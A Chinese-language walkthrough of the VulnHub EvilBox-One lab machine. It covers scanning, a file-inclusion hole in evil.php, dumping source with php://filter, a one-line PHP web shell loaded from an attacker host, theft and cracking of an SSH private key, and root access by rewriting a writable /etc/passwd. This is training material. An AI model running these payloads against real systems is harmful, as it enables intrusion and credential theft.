> 靶机信息 https://download.vulnhub.com/evilbox/EvilBox---One.ova

### 1.主机发现

```
ifconfig 
#本机IP:192.168.0.110 攻击机IP
```

![image-20211208193627499](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208193627499-20220106215922469-20220106220051089-20220106221119106.png)

```
fping -gaq 192.168.0.0/24
```

![image-20211208195647496](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208195647496.png)

探测到的存活主机列表中，192.168.0.108是目标靶机的IP地址

### 2.端口扫描

```
nmap -p- 192.168.0.108
```

![image-20211208195931120](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208195931120.png)

目标靶机开放了22，80端口

### 3.端口服务探测

```
nmap -p22,80 -A 192.168.0.108
# -A参数的作用大致等于-sV -sC -O,比较方便
```

![image-20211208200300990](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200300990.png)

扫描结果显示目标靶机的

22端口开放了ssh服务，并列举了些不同方式加密的密钥信息

80端口开放了Apache的Web服务，Debian操作系统

### 4.访问80端口

![image-20211208200757525](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200757525.png)

只是一个简单的Apache页面，未发现有用信息

### 5.爆破22端口

![image-20211208201510674](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208201510674.png)

对22端口root用户的密码进行了爆破 但最终无果

### 6.目录扫描

```
gobuster dir -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html
```

![image-20211208204109760](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204109760.png)

发现的目录/文件有 index.html,robots.txt,secret 分别尝试：

#### 1)ip/index.html

![image-20211208203719626](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203719626.png)

主页亦是先前的80端口默认页面..

#### 2)ip/robots.txt

![image-20211208201957960](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208201957960.png)

页面内显示了“Hello H4x0r”，怀疑是否是用户名或者路径，尝试针对用户名H4x0r的ssh密码爆破，结果失败..

尝试访问ip/H4x0r结果也是失败..

#### 3)ip/secret

![image-20211208203843733](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203843733.png)

访问后发现是个空目录，查看源码也没有任何信息..

再对ip/secret下的目录进行扫描

```
gobuster dir -u http://192.168.0.108/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html
```

![image-20211208204358197](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204358197.png)

发现了/secret目录下的index.html，evil.php 分别尝试：

#### 4)ip/secret/index.html

![image-20211208204647211](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204647211.png)

空白😱..

#### 5)ip/secret/evil.php

![image-20211208204721125](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204721125.png)

空白😱..

截止到目前，还没有任何直接的发现，停留在此..😮‍💨

### 7.绝境的求救信--php参数爆破

思考🤔：php页面是如何向服务器端提交数据的呢？

Emm:通过一些参数赋值

http://192.168.0.108/secret/evil.php?**a=123&b=456**

回忆🤔：平时做攻击、注入等时的大致步骤都是，在URL先寻找参数名称，再尝试写入payload完成注入，包括使用POST方法也是寻找参数在body里寻找数据注入



💊得救的关键就是-->**寻找正确的参数**-->**参数爆破**！！！💣

确定目标：

http://192.168.0.108/secret/evil.php?**cs**=**csz**

对**参数名位置**(cs)和**参数值位置**(csz)

工具选择：

第一反应是bp，但是这里为了拓展武器选择使用ffuf

字典选择：

​	针对参数名选择burp-parameter-names.txt

​	针对参数值选择DIY大法🐸

```
vi DIY.txt #放入一些数字、字母、符号
```

```
cat DIY.txt
```

![image-20211208211435869](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208211435869.png)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:cs -w DIY.txt:csz -u http://192.168.0.108/secret/evil.php?cs=csz -fs 0
#-w分别指定两个字典  
#:为了区分字典，指定参数
#-fs 0 过滤掉无效信息（返回页面为空 0），使结果更清晰易读
```

![image-20211208213846947](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208213846947.png)

结果很不理想..😫

分析一下：

刚才的参数名字典中应该是涵盖了大部分常用参数名 应该不存在直接问题✅

刚才的赋值字典是手动输入了几个字母、数字、符号 怀疑是这里掉了链子❌

稍微变换一下思路：

在参数名的位置仍使用burp-parameter-names.txt字典，参数值的位置放置一个目标靶机上**已经确定存在的文件**，当在爆破参数名的过程中若出现了一个可用的参数名时，那么该参数便会引用该**已经确定存在的文件**，是否有可能利用文件包含读取文件的信息？

结合之前的目录扫描，不难想到这个**已经确定存在的文件**不就是**index.html**吗？



重新构建：

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.108/secret/evil.php?FUZZ=../index.html -fs 0
#取消参数值的字典 替换为../index.html
#FUZZ模糊测试关键字
```

![image-20211208213756058](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208213756058.png)

结果显示：参数名称command可用

测试访问http://192.168.0.108/secret/evil.php?command=../index.html

![image-20211208214129645](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214129645.png)

可以正常访问



测试访问http://192.168.0.108/secret/evil.php?command=evil.php

![image-20211208214243394](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214243394.png)

访问结果仍为空白页面，查看源码为1行空白



测试是否存在文件包含漏洞

访问http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd

![image-20211208214549193](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214549193.png)

结果成功读取/etc/passwd，说明存在文件包含漏洞

### 8.远程文件包含

尝试在kali攻击机上构造一句话木马

```
cd /var/www/html
```

```
vi a.php
```

><?php $var=shell_exec($_GET['cmd']); echo $var?>

![image-20211208215246492](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208215246492.png)

利用远程文件包含上传

```
sudo systemctl start apache2 #在kali本机开启web服务 可在执行后 使目标可以访问到a.php
```



![image-20211208215647665](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208215647665.png)

```
http://192.168.0.108/secret/evil.php?command=http://192.168.0.110/a.php?cmd=id
#尝试执行id命令
```

![image-20211208220144981](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208220144981.png)

并没有返回，尝试了ls等其他命令也没有返回，说明此处利用远程文件包含是行不通的

### 9.php封装器

php作为一种语言，提供许多其他协议的访问方式、许多封装器，例如php:// file:// ftp:// data:// zip://

利用php://来读取目标系统上的php文件（当访问目标服务器上的php文件时，目标服务器会使用php执行代码来处理该文件，故往往读取不到php文件的源码，读到的只是代码执行后返回的结果。但若是先使用base64进行编码后，目标服务器无法正常读取可识别的代码，不但不会执行该代码，反而会返回被base64编码后的字符串）

```
http://192.168.0.108/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php
```

![image-20211208221355954](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208221355954.png)

成功返回base64编码的字符串（evil.php源码）

>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==

base64解码后：

![image-20211208221618439](https://gitee.com/byesec/picture/raw/master/6/image-20211208221618439.png)

><?php
>$filename = $_GET['command'];   #读取赋值
>include($filename);             #引用读取到的赋值
>?>

测试向目标写入能否成功，可能没有写入的权限

```
echo -n 123 | base64       #得到123经过base64编码的字符
```

![image-20211208222226443](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222226443.png)

```
http://192.168.0.108/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&txt=MTIz
#利用php://封装器将MTIz解码后写入名为test.php的文件
```

![image-20211208222639627](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222639627.png)

![image-20211208222705794](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222705794.png)

访问失败 说明刚才的写入操作失败了..再次陷入僵局..

### 10.mowree?

又重新翻看了之前搜集到的信息，发现在/etc/passwd目录下，存在一个名为mowree的用户

![image-20211208223113476](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223113476.png)

只有用户名，那么是否可以再尝试一下ssh登陆密码爆破？

先确认一下ssh登陆的认证方式

```
ssh mowree@192.168.0.108 -v
```

![image-20211208223554832](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223554832.png)

![image-20211208223639905](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223639905.png)

结果显示目标支持password密码认证以外，还支持publickey公钥身份认证



那么联想到 一个能够登陆该服务器的的用户必然存在其登陆所用的公钥,那么该公钥文件位于哪里呢？

是否存在于用户目录文件下呢？结合利用文件包含读文件！

```
http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/authorized_keys
#.ssh/authorized_keys 已经授权的用户的默认公钥存储路径
```

如果能够读取到则说明服务器是已授权允许该用户登陆的

![image-20211208225112071](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208225112071.png)

成功读取到存放在目标用户mowree目录下的公钥

>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne

页面返回信息：公私钥生成使用RSA算法、用户mowree登录到EvilBoxOne

既然已经被授权--存在公钥--那么是否也应该在默认目录下存在私钥呢？

```
http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa
#.ssh/id_rsa 已经授权的用户的默认私钥存储路径
```

![image-20211208225724998](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208225724998.png)

成功读取到目标用户mowree目录下的私钥(右键源码 格式更佳！)

>```
>-----BEGIN RSA PRIVATE KEY-----
>Proc-Type: 4,ENCRYPTED
>DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
>
>uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
>hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
>o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
>+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
>b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
>HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
>9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
>zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
>rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
>tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
>94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
>VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
>Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
>hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
>Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
>IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
>MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
>62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
>Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
>p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
>pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
>KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
>i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
>4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
>8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
>-----END RSA PRIVATE KEY-----
>```

### 11.手握公私钥尝试登陆

清点一下：

服务器支持公钥的认证方式--用户的目录下存在公钥--服务器允许用户mowree使用公钥登陆--拿取到了私钥--拥有私钥的任何用户都可以使用私钥尝试登陆服务器--不需要账号密码--利用公钥证明身份

```
cd ~
```

```
vi id_rsa
```

![image-20211208231311174](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231311174.png)

```
chmod 600 id_rsa
```

![image-20211208231920190](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231920190.png)

使用私钥ssh登陆

```
ssh mowree@192.168.0.108 -i id_rsa 
```

![image-20211208232318351](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208232318351.png)

再遇密码..没完没了..

### 12.爆破狂人约翰

霸王硬上弓-->爆破💣-->选择一本足够强大的字典📖

```
cp /usr/share/wordlists/rockyou.txt.gz . 
```

```
gunzip rockyou.txt.gz
```

![image-20211208232910798](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208232910798.png)

使用john前，需将私钥转换为该工具可以使用爆破的格式

```
cd /usr/share/john
```

```
./ssh2john.py ~/id_rsa > ~/hash
```

![image-20211208233910653](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208233910653.png)

```
john hash --wordlist=rockyou.txt
```

![image-20211208234313571](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208234313571.png)

爆破结果得到的密码为：unicorn

胸有成竹的进行登陆

```
ssh mowree@192.168.0.108 -i id_rsa 
```

![image-20211208234716317](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208234716317.png)

终于突破了边界 获取到了第一个flag 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ

另外一个flag应该是需要root用户才能拿到的

### 13.提权冲锋🐛

尝试提权

#### 1)查看当前有无计划任务 

利用脚本就...

```
crontab -l    
```

![image-20211208235115298](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235115298.png)

并没有😖



#### 2)查看sudo权限配置方面有无缺陷

```
sudo -l       	
```

![image-20211208235258827](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235258827.png)

并没有😖



#### 3)查看内核是否存在漏洞

```
uname -a      
```

```
searchsploit 4.19 
```

![image-20211208235652875](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235652875.png)

几番尝试后 都失败了.....裂开......😭



#### 4)利用find suid

寻找这台靶机上的哪些程序/可执行文件是具有suid权限且属主是root

```
find / -perm /4000 2>/dev/null
#4000即为suid权限
#因为是从/根目录搜索的所有即搜索整台靶机上的程序 可能因权限不足会存在报错 为了方便看到成功信息 将错误信息定向到/dev/null
```

![image-20211209000653290](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209000653290.png)

结果很遗憾这些可执行文件都是系统默认的 即是安全的 没能够找到突破的点

#### 5)利用find sgid

```
find / -perm /2000 2>/dev/null
#2000即为sgid权限
```

![image-20211209001212656](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209001212656.png)

依然是默认的..很安全..

#### 6)寻找系统中可写的文件

```
find / -writable 2>/dev/null
```

```
find / -writable 2>/dev/null | grep -v proc
```

>mowree@EvilBoxOne:~$ find / -writable 2>/dev/null | grep -v proc
>/tmp
>/tmp/.ICE-unix
>/tmp/.X11-unix
>/tmp/.Test-unix
>/tmp/.font-unix
>/tmp/.XIM-unix
>/sys/kernel/security/apparmor/.null
>/sys/kernel/security/apparmor/.remove
>/sys/kernel/security/apparmor/.replace
>/sys/kernel/security/apparmor/.load
>/sys/kernel/security/apparmor/.access
>/sys/fs/cgroup/memory/user.slice/cgroup.event_control
>/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
>/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-14.scope/cgroup.event_control
>/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
>/sys/fs/cgroup/memory/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/dev-disk-by\x2duuid-635c225b\x2d1f26\x2d4d4e\x2d912a\x2d87db360ddbb1.swap/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/ifup@enp0s3.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/system-getty.slice/getty@tty1.service/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
>/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
>/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
>/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
>/run/dbus/system_bus_socket
>/run/user/1000
>/run/user/1000/systemd
>/run/user/1000/systemd/private
>/run/user/1000/systemd/notify
>/run/shm
>/run/systemd/journal/dev-log
>/run/systemd/journal/syslog
>/run/systemd/journal/socket
>/run/systemd/journal/stdout
>/run/systemd/private
>/run/systemd/notify
>/run/lock
>/run/udev/static_node-tags/uaccess/snd\x2fseq
>/run/udev/static_node-tags/uaccess/snd\x2ftimer
>/home/mowree
>/home/mowree/.profile
>/home/mowree/.bash_history
>/home/mowree/.ssh
>/home/mowree/.ssh/id_rsa
>/home/mowree/.ssh/authorized_keys
>/home/mowree/.bashrc
>/home/mowree/.bash_logout
>/home/mowree/.local
>/home/mowree/.local/share
>/home/mowree/.local/share/nano
>**/etc/passwd**                     #咦❓
>/dev/dvd
>/dev/cdrom
>/dev/fb0
>/dev/dri/by-path/pci-0000:00:02.0-card
>/dev/dri/card0
>/dev/sg1
>/dev/snd/seq
>/dev/snd/timer
>/dev/net/tun
>/dev/fuse
>/dev/log
>/dev/mqueue
>/dev/shm
>/dev/disk/by-id/ata-VBOX_CD-ROM_VB2-01700376
>/dev/disk/by-path/pci-0000:00:01.1-ata-2
>/dev/block/11:0
>/dev/sr0
>/dev/char/29:0
>/dev/char/226:0
>/dev/char/21:1
>/dev/char/5:0
>/dev/char/5:2
>/dev/char/1:5
>/dev/char/1:9
>/dev/char/1:8
>/dev/char/1:3
>/dev/char/1:7
>/dev/stderr
>/dev/stdout
>/dev/stdin
>/dev/fd
>/dev/pts/0
>/dev/ptmx
>/dev/tty
>/dev/urandom
>/dev/random
>/dev/full
>/dev/zero
>/dev/null
>/usr/lib/systemd/system/sendsigs.service
>/usr/lib/systemd/system/bootmisc.service
>/usr/lib/systemd/system/umountfs.service
>/usr/lib/systemd/system/single.service
>/usr/lib/systemd/system/mountdevsubfs.service
>/usr/lib/systemd/system/umountroot.service
>/usr/lib/systemd/system/rmnologin.service
>/usr/lib/systemd/system/motd.service
>/usr/lib/systemd/system/reboot.service
>/usr/lib/systemd/system/bootlogd.service
>/usr/lib/systemd/system/rcS.service
>/usr/lib/systemd/system/hostname.service
>/usr/lib/systemd/system/cryptdisks.service
>/usr/lib/systemd/system/mountnfs-bootclean.service
>/usr/lib/systemd/system/rc.service
>/usr/lib/systemd/system/stop-bootlogd-single.service
>/usr/lib/systemd/system/mountall.service
>/usr/lib/systemd/system/mountall-bootclean.service
>/usr/lib/systemd/system/stop-bootlogd.service
>/usr/lib/systemd/system/cryptdisks-early.service
>/usr/lib/systemd/system/checkroot.service
>/usr/lib/systemd/system/umountnfs.service
>/usr/lib/systemd/system/mountkernfs.service
>/usr/lib/systemd/system/halt.service
>/usr/lib/systemd/system/checkroot-bootclean.service
>/usr/lib/systemd/system/checkfs.service
>/usr/lib/systemd/system/bootlogs.service
>/usr/lib/systemd/system/mountnfs.service
>/usr/lib/systemd/system/hwclock.service
>/usr/lib/systemd/system/x11-common.service
>/var/tmp
>/var/lib/php/sessions
>/var/lock

![image-20211209002251743](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209002251743.png)

发现/etc/passwd竟然是可写的

这里通过查看kali本机的/etc/passwd权限 对比一下此处的异常

![image-20211209002654265](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209002654265.png)

而目标靶机上的用户mowree居然具有/etc/passwd文件的写权限 突破的一线曙光🌞



linux系统内的用户名存放在/etc/passwd文件内，密码存放在/etc/shadow文件内，但是/etc/shadow文件没有权限，所以下一步的思路是借助已有的对/etc/passwd的写权限，能否修改root密码？



给root账号生成密码

```
openssl passwd -1   #-1 md5加密算法代号      设定密码123456
```

![image-20211209004130358](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209004130358.png)



复制密文$1$oSFKywfc$hOVlE.SmqSlT5aAhNHQsS1

```
vi /etc/passwd        #修改root用户的密码
```

![image-20211209005157113](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209005157113.png)

更改成功后

切换至root用户

```
su root
```

![image-20211209005326964](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209005326964.png)

提权成功，拿到第二个flag 36QtXfdJWvdC0VavlPIApUbDlqTsBM



🏆flag1

>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
>
>

🏆flag2

>36QtXfdJWvdC0VavlPIApUbDlqTsBM
>
>





